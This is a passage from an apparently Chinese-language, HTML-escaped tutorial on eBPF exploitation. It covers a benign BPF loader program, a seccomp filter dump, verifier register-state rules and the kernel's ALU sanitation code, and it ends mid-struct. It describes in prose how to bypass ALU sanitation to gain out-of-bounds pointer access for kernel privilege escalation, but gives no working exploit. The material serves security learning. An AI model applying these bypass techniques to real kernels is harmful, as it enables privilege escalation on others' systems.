class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;//gcc ./bpf.c -o bpf&#xD;&#xA;#include &amp;lt;stdio.h&amp;gt;&#xD;&#xA;#include &amp;lt;stdlib.h&amp;gt;  //为了exit()函数&#xD;&#xA;#include &amp;lt;stdint.h&amp;gt;    //为了uint64_t等标准类型的定义&#xD;&#xA;#include &amp;lt;errno.h&amp;gt;    //为了错误处理&#xD;&#xA;#include &amp;lt;unistd.h&amp;gt;&#xD;&#xA;#include &amp;lt;linux/bpf.h&amp;gt;    //位于/usr/include/linux/bpf.h, 包含BPF系统调用的一些常量, 以及一些结构体的定义&#xD;&#xA;#include &amp;lt;sys/syscall.h&amp;gt;    //为了syscall()&#xD;&#xA;&#xD;&#xA;//类型转换, 减少warning, 也可以不要&#xD;&#xA;#define ptr_to_u64(x) ((uint64_t)x)&#xD;&#xA;&#xD;&#xA;//对于系统调用的包装, __NR_bpf就是bpf对应的系统调用号, 一切BPF相关操作都通过这个系统调用与内核交互&#xD;&#xA;int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)&#xD;&#xA;{&#xD;&#xA;    return syscall(__NR_bpf, cmd, attr, size);&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;//用于保存BPF验证器的输出日志&#xD;&#xA;#define LOG_BUF_SIZE 0x1000&#xD;&#xA;char bpf_log_buf[LOG_BUF_SIZE];&#xD;&#xA;&#xD;&#xA;//通过系统调用, 向内核加载一段BPF指令&#xD;&#xA;int bpf_prog_load(enum bpf_prog_type type, const struct bpf_insn* insns, int insn_cnt, const char* license)&#xD;&#xA;{&#xD;&#xA;    union bpf_attr attr = {&#xD;&#xA;        .prog_type = type,        //程序类型&#xD;&#xA;        .insns = ptr_to_u64(insns),    //指向指令数组的指针&#xD;&#xA;        .insn_cnt = insn_cnt,    //有多少条指令&#xD;&#xA;        .license = ptr_to_u64(license),    //指向整数字符串的指针&#xD;&#xA;        .log_buf = ptr_to_u64(bpf_log_buf),    //log输出缓冲区&#xD;&#xA;        .log_size = LOG_BUF_SIZE,    //log缓冲区大小&#xD;&#xA;        .log_level = 2,    //log等级&#xD;&#xA;    };&#xD;&#xA;&#xD;&#xA;    return bpf(BPF_PROG_LOAD, &amp;amp;attr, sizeof(attr));&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;//BPF程序就是一个bpf_insn数组, 一个struct bpf_insn代表一条bpf指令&#xD;&#xA;struct bpf_insn bpf_prog[] = {&#xD;&#xA;    { 0xb7, 0, 0, 0, 0x2 }, //初始化一个struct bpf_insn, 指令含义: mov r0, 0x2;&#xD;&#xA;    { 0x95, 0, 0, 0, 0x0 }, //初始化一个struct bpf_insn, 指令含义: exit;&#xD;&#xA;};&#xD;&#xA;&#xD;&#xA;int main(void){&#xD;&#xA;    //加载一个bpf程序&#xD;&#xA;    int prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, bpf_prog, sizeof(bpf_prog)/sizeof(bpf_prog[0]), &amp;#34;GPL&amp;#34;);&#xD;&#xA;    if(prog_fd&amp;lt;0){&#xD;&#xA;        perror(&amp;#34;BPF load prog&amp;#34;);&#xD;&#xA;        exit(-1);&#xD;&#xA;    }&#xD;&#xA;    printf(&amp;#34;prog_fd: %d\n&amp;#34;, prog_fd);&#xD;&#xA;    printf(&amp;#34;%s\n&amp;#34;, bpf_log_buf);    //输出程序日志&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;什么是ebpf&#34;&gt;&lt;span&gt;什么是ebpf&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e4%bb%80%e4%b9%88%e6%98%afebpf&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;我们熟悉的&lt;code&gt;seccomp&lt;/code&gt;就是一个被&lt;code&gt;attach&lt;/code&gt;到系统调用的&lt;code&gt;bpf&lt;/code&gt;程序，每次进行系统调用前都会执行这个&lt;code&gt;bpf&lt;/code&gt;程序，禁掉一些系统调用&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt; line  CODE  JT   JF      K&#xD;&#xA;=================================&#xD;&#xA; 0000: 0x20 0x00 0x00 0x00000004  A = arch&#xD;&#xA; 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010&#xD;&#xA; 0002: 0x20 0x00 0x00 0x00000000  A = sys_number&#xD;&#xA; 0003: 0x35 0x00 0x01 0x40000000  if (A &amp;lt; 0x40000000) goto 0005&#xD;&#xA; 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010&#xD;&#xA; 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009&#xD;&#xA; 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009&#xD;&#xA; 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009&#xD;&#xA; 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010&#xD;&#xA; 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW&#xD;&#xA; 0010: 0x06 0x00 0x00 0x00000000  return KILL&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;ebpf&lt;/code&gt;的作用不仅局限于此，它能够&lt;code&gt;attach&lt;/code&gt;到内核里几乎任何地方，在内核中存取数据等等&lt;/p&gt;&#xA;&lt;p&gt;但是，这个&lt;code&gt;bpf&lt;/code&gt;程序是我们自己写的，它还会被放入内核，这是不安全的，所以我们写的&lt;code&gt;bpf&lt;/code&gt;程序会通过&lt;code&gt;ebpf verifier&lt;/code&gt;进行检查，才能被放入内核&lt;/p&gt;&#xA;&lt;p&gt;其次，&lt;code&gt;bpf&lt;/code&gt;程序有他的一套架构（寄存器，指令集这些），所以他要被编译(JIT compilier)成x86的汇编，才能被执行&lt;/p&gt;&#xA;&lt;p&gt;如果&lt;code&gt;ebpf verifier&lt;/code&gt;能被绕过，那我们就能把我们写的&lt;code&gt;bpf&lt;/code&gt;程序&lt;code&gt;attach&lt;/code&gt;到某个地方，然后执行它进行提权。这也是&lt;code&gt;ebpf pwn&lt;/code&gt;学习的主要内容：绕过&lt;code&gt;ebpf verifier&lt;/code&gt;的检查，进行提权。&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;bpf程序架构&#34;&gt;&lt;span&gt;bpf程序架构&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#bpf%e7%a8%8b%e5%ba%8f%e6%9e%b6%e6%9e%84&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;寄存器&#34;&gt;&lt;span&gt;寄存器&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%af%84%e5%ad%98%e5%99%a8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;eBPF 虚拟机一共有 11 个 64 位寄存器，一个程序计数器（PC）与一个固定大小的堆栈（通常为 512KB），在 x86 架构下的对应关系如下：&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th style=&#34;text-align: center&#34;&gt;eBPF 寄存器&lt;/th&gt;&#xA;          &lt;th style=&#34;text-align: center&#34;&gt;映射 x86_64 寄存器&lt;/th&gt;&#xA;          &lt;th style=&#34;text-align: center&#34;&gt;用途&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;R0&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;rax&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;函数返回值&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;R1&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;rdi&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;argv1&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;R2&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;rsi&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;argv2&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;R3&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;rdx&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;argv3&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;R4&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;rcx&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;argv4&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;R5&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;r8&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;argv5&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;R6&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;rbx&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;callee 保存&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;R7&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;r13&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;callee 保存&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;R8&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;r14&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;callee 保存&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;R9&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;r15&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;callee 保存&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;R10（只读）&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;rbp&lt;/td&gt;&#xA;          &lt;td style=&#34;text-align: center&#34;&gt;堆栈指针寄存器&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;verifier&#34;&gt;&lt;span&gt;verifier&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#verifier&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;verifier&lt;/code&gt;的主要工作包括：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;验证结构，保证循环次数，不存在死循环（早期的内核禁止循环）；清理&lt;code&gt;unreachable instructions&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;模拟执行每一条指令，观察寄存器和栈状态的变化，确保不存越界读写等不安全行为&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;寄存器状态跟踪&#34;&gt;&lt;span&gt;寄存器状态跟踪&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%af%84%e5%ad%98%e5%99%a8%e7%8a%b6%e6%80%81%e8%b7%9f%e8%b8%aa&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;状态类型&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;verifier&lt;/code&gt;会跟踪每个寄存器的状态，给每个寄存器分配一个&lt;code&gt;struct bpf_reg_state&lt;/code&gt;，每个寄存器都有类型(type)，类型可以分为以下三大类：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;未初始化寄存器(not_init)，还没经过赋值操作，使用会导致验证失败&lt;/li&gt;&#xA;&lt;li&gt;标量寄存器(scalar_value)，被赋予了整型值，能进行算数运算，不能作为指针进行内存访问&lt;/li&gt;&#xA;&lt;li&gt;指针寄存器(pointer type)，该寄存器为一个指针，verifier 会检查内存访问是否超出指针允许的范围&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;一些规则&#34;&gt;&lt;span&gt;一些规则&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e4%b8%80%e4%ba%9b%e8%a7%84%e5%88%99&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;SCALAR 不能直接当指针用&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;允许&lt;code&gt;ptr + known_safe_offset&lt;/code&gt;，&lt;code&gt;ptr + unknown_scalar&lt;/code&gt;之后不能解引用（要进行边界检查才能解引用）&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;ptr + ptr 禁止，&lt;code&gt;ptr - ptr&lt;/code&gt;有条件允许：如果两个指针指向同一个内存对象，Verifier 允许相减来计算距离（offset）。结果会变成 &lt;code&gt;SCALAR&lt;/code&gt;。但不同对象的指针相减是禁止的。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;pointer 不能做任意算术运算，Mul, Div, Mod, Shift, And, Or, Xor 对指针都是非法的。只有 Add/Sub (offset) 是合法的。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;ALU32 会 &lt;strong&gt;清零高 32 位&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;未初始化的寄存器 / stack 禁止使用（程序开始时，寄存器r1已经初始化为一个指针，类型为&lt;code&gt;PTR_TO_CTX&lt;/code&gt;）&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;不能把一个&lt;strong&gt;内核指针&lt;/strong&gt;（如 &lt;code&gt;sk_buff&lt;/code&gt; 的地址）直接存到 Map 里，让用户态读取。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;alu-sanitation&#34;&gt;&lt;span&gt;ALU Sanitation&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#alu-sanitation&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;在对一个指针类型寄存器进行加减某个&lt;code&gt;offset&lt;/code&gt;时，一些指令会被加上去 ，验证&lt;code&gt;offset&lt;/code&gt;的合法性，也就是保证这个指针的活动范围&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;BPF_MOV32_IMM(BPF_REG_AX, aux-&amp;gt;alu_limit - 1); // -1 in old kernel versions&#xD;&#xA;BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);&#xD;&#xA;BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);&#xD;&#xA;BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);&#xD;&#xA;BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);&#xD;&#xA;BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单来说，指针类型寄存器有一个活动范围，指向栈的寄存器活动范围就在栈中，不能通过加减某个&lt;code&gt;offset&lt;/code&gt;从而指到别的地方去&lt;/p&gt;&#xA;&lt;p&gt;绕过&lt;code&gt;ALU Sanitation&lt;/code&gt;分两种情况：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;如果有一个指针指向&lt;code&gt;0x1000&lt;/code&gt;，它允许最大指向&lt;code&gt;0x1500&lt;/code&gt;，最小指向&lt;code&gt;0x500&lt;/code&gt;。通过了某些漏洞，我们让&lt;code&gt;verifier&lt;/code&gt;认为这个指针还是&lt;code&gt;0x1000&lt;/code&gt;，但是它实际上是&lt;code&gt;0x500&lt;/code&gt;，那么这个寄存器实际上的活动范围就是&lt;code&gt;0 - 0x1000&lt;/code&gt;，能够越界读到前面的东西&lt;/li&gt;&#xA;&lt;li&gt;当这个指针已经在它活动范围的边界的时候，上面的这串指令又把边界减去了1（aux-&amp;gt;alu_limit - 1）,这就导致了无符号数的回绕，边界变成了&lt;code&gt;0xFFFFFFFF&lt;/code&gt;，这样我们就能让这个指针指向很大一个范围了&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;在一些新的内核这个bug被修复了&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;bpf_reg_state：维护了BPF寄存器的状态。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct bpf_reg_state {&#xD;&#xA;&#x9;/* 各字段的顺序是重要的.  参见 states_equal() */&#xD;&#xA;&#x9;enum bpf_reg_type type;&#xD;&#xA;&#x9;/* 指针偏移的固定部分, 仅指针类型 */&#xD;&#xA;&#x9;s32 off;&#xD;&#xA;&#x9;union {&#xD;&#xA;&#x9;&#x9;/* 当 type == PTR_TO_PACKET 时可用 */&#xD;&#xA;&#x9;&#x9;int range;&#xD;&#xA;&#xD;&#xA;&#x9;&#x9;/* 当 type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |&#xD;&#xA;&#x9;&#x9; *   PTR_TO_MAP_VALUE_OR_NULL 时可用&#xD;&#xA;&#x9;&#x9; */&#xD;&#xA;&#x9;&#x9;struct {&#xD;&#xA;&#x9;&#x9;&#x9;struct bpf_map *map_ptr;&#xD;&#xA;&#x9;&#x9;&#x9;/* 为了从外部映射中区分映射查找&#xD;&#xA;&#x9;&#x9;&#x9; * map_uid 对于指向内部映射的寄存器为非 0 值&#xD;&#xA;&#x9;&#x9;&#x9; */&#xD;&#xA;&#x9;&#x9;&#x9;u32 map_uid;&#xD;&#xA;&#x9;&#x9;};&#xD;&#xA;&#xD;&#xA;&#x9;&#x9;/* for PTR_TO_BTF_ID */&#xD;&#xA;&#x9;&#x9;struct {&#xD;&#xA;&#x9;&#x9;&#x9;struct btf *btf;&#xD;&#xA;&#x9;&#x9;&#x9;u32 btf_id;&#xD;&#xA;&#x9;&#x9;};&#xD;&#xA;&#xD;&#xA;&#x9;&#x9;struct { /* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */&#xD;&#xA;&#x9;&#x9;&#x9;u32 mem_size;&#xD;&#xA;&#x9;&#x9;&#x9;u32 dynptr_id; /* for dynptr slices */&#xD;&#xA;&#x9;&#x9;};&#xD;&#xA;&#xD;&#xA;&#x9;&#x9;/* For dynptr stack slots */&#xD;&#xA;&#x9;&#x9;struct {&#xD;&#xA;&#x9;&#x9;&#x9;enum bpf_dynptr_type type;&#xD;&#xA;&#x9;&#x9;&#x9;/* 一个 dynptr 为 16 字节， 故其占用 2 个 stack slots.&#xD;&#xA;&#x9;&#x9;&#x9; * 我们需要追踪哪一个 slot 为第一个防止用户可能尝试传入一个从&#xD;&#xA;&#x9;&#x9;&#x9; * dynptr 的第二个 slot 开始的地址的情况的 slot.&#xD;&#xA;&#x9;&#x9;&#x9; */&#xD;&#xA;&#x9;&#x9;&#x9;bool first_slot;&#xD;&#xA;&#x9;&#x9;} dynptr;&#xD;&#xA;&#xD;&#xA;&#x9;&#x9;/* 